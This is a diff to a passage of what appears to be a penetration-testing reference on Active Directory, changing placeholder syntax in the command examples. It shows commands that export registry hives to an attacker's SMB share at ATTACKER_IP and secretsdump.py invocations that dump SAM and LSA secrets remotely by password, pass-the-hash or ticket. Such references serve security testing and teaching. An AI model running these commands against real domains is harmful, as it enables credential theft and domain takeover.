@@ -68,7 +68,7 @@ This operation can be conducted remotely with [BackupOperatoToDA](https://github
 > The attacker can start an SMB server, and indicate an UNC path including his IP address so that the hives get exported directly to his server.
 
 ```bash
-BackupOperatorToDA.exe -d $DOMAIN -u $USER -p $PASSWORD -t $TARGET -o "\\ATTACKER_IP\someshare"
+BackupOperatorToDA.exe -d $DOMAIN -u $USER -p $PASSWORD -t $TARGET -o "\\$ATTACKER_IP\someshare"
 ```
 
 > [!TIP]
@@ -100,13 +100,13 @@ Here are some examples and tools that can be used for local/remote/offline dumpi
 
 ```bash
 # Remote dumping of SAM & LSA secrets
-secretsdump.py 'DOMAIN/USER:PASSWORD@TARGET'
+secretsdump.py "$DOMAIN/$USER:$PASSWORD@$TARGET"
 
 # Remote dumping of SAM & LSA secrets (pass-the-hash)
-secretsdump.py -hashes 'LMhash:NThash' 'DOMAIN/USER@TARGET'
+secretsdump.py -hashes "ffffffffffffffffffffffffffffffff:$NT_HASH" "$DOMAIN/$USER@$TARGET"
 
 # Remote dumping of SAM & LSA secrets (pass-the-ticket)
-secretsdump.py -k 'DOMAIN/USER@TARGET'
+secretsdump.py -k "$DOMAIN/$USER@$TARGET"
 
 # Offline dumping of LSA secrets from exported hives
 secretsdump.py -security '/path/to/security.save' -system '/path/to/system.save' LOCAL
